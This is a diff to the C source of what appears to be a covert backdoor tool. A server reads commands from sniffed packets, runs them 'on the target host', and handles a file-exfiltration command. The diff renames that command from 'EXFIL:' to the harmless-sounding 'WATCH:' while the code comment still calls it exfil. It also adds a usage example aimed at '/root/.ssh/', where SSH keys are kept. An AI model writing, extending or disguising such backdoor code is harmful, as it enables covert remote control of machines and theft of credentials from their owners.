@@ -236,7 +236,7 @@ void client(struct client_opt c_opt){
     
     printf("Total Buffer: %zu bytes\n%s\n", strlen(msg_buf.buffer), msg_buf.buffer);
     
-    if(strncmp(c_opt.command,"EXFIL:",6) == 0){
+    if(strncmp(c_opt.command,"WATCH:",6) == 0){
         char file_name[1024] = {0};
         
         char current_date[128] = {0};
@@ -643,7 +643,7 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     char output[MESSAGE_MAX_SIZE] = {0};
     
     // If file exfil command
-    if(strncmp(bd_command,"EXFIL:",6) == 0){
+    if(strncmp(bd_command,"WATCH:",6) == 0){
         printf("%s\n", bd_command);
         
         char file_path[1024] = {0};
@@ -826,7 +826,9 @@ void usage(){
     printf("  -p <target_port>      The target port to send to.\n");
     printf("  -i <interface_name>   Network interface to use.\n");
     printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
-    printf("  -x <command>          The command to run on the target host.\n");
+    printf("  -x <command>          The command to run on the target host. To watch a directory\n");
+    printf("                        for activity, type 'WATCH:' followed by the directory path\n");
+    printf("                        e.g. 'WATCH:/root/.ssh/'.\n");
     printf("SERVER\n");
     printf("  -s                    Enables server mode.\n");
     printf("  -i <interface_name>   Network interface to use.\n");
